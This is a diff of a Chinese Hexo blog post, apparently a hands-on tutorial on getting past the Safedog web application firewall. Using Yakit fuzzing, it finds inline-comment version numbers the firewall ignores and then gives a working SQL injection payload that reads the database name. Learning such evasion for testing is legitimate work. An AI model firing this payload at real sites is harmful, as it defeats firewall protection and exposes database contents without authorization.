@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——tags | Hexo</title>
+  <title>我的技术与生活——绕过安全狗（免费） | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——tags`
+    document.title = `我的技术与生活——绕过安全狗（免费）`
   </script>
 <meta name="generator" content="Hexo 6.3.0"></head>
 
@@ -340,14 +340,116 @@
       <div id="main-container" class="main-container">
 
 
-  <link rel="stylesheet" href="/css/partial/tags.css" />
+  <link rel="stylesheet" href="/css/partial/article.css" />
 
-<div class="tags">
-  <h2 class="tags-title">小站标签</h2>
-  <div class="tags-list">
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">绕过安全狗（免费）</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2024-01-05 14:45:12</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <p>1.绕过安全狗（免费）<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097040451-9032c6d7-37b3-42e1-82b1-0baa142a3f51.png" alt="image.png"><br>yakit抓包发送到web Fuzzer</p>
+<p><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704096627261-05677c76-b359-4328-b5ae-f3c6e3436657.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704096705125-8282bdaa-6531-4a72-8f56-a7c49bcb4b57.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704032542267-5e65c977-e4ea-4b49-bc9a-0c8bce15d8c7.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704096781488-190b2a76-5e0b-49c1-9e41-80f54a90c211.png" alt="image.png"><br>在本地会生成记事本<br>模糊测试：<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704096897404-d52ce259-3de0-4ee0-993c-a7c00074d65e.png" alt="image.png"><br>测试出数字太长会报错，识别不了，太短会报狗，被过滤<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097205975-b771bb8b-76e1-4ba6-9502-760cce6df4e7.png" alt="image.png"><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097229824-06e02a8d-ef38-4e3f-a0c4-c64b263a2f86.png" alt="image.png"><br>找到被拦截，报狗的包进行模糊测试<img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097486502-4227e947-49a2-4d46-9637-907f9fd23590.png" alt="image.png"><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097401733-aa8e50e6-9255-4d1d-a383-d60a24ccfe76.png" alt="image.png"><br>把12345换成5位验证码（插入标签）<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097490174-129639ed-10a2-4545-91ad-0158a2a7e832.png" alt="image.png"><br>发包<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097732380-3e17e8f9-2a06-405d-bbe4-35fa9116a469.png" alt="image.png"><br>输入注入语句，找到没被过滤的数字<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704097695014-17baa102-a9dc-412c-b113-dfdb53308453.png" alt="image.png"><br>随便选一个没被过滤的数字00044拿来进行绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*//*/</span>     替换空格</span><br><span class="line"><span class="comment">/*!database*/</span>     <span class="comment">/*!*/</span>内联强制执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704098336834-c20dc969-3611-481a-9347-b60106602843.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27;union/*//*//*!00044select*/1,/*//*//*!00044database*//*//*//*!00044()*/,3-- -</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2024/01/05/绕过安全狗（免费）/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
     
   </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2024/01/05/sqlmap/">sqlmap</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
 </div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2024/01/05/绕过安全狗（免费）/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
 
 </div>
       <div class="main-right-wrapper"><div class="main-right">
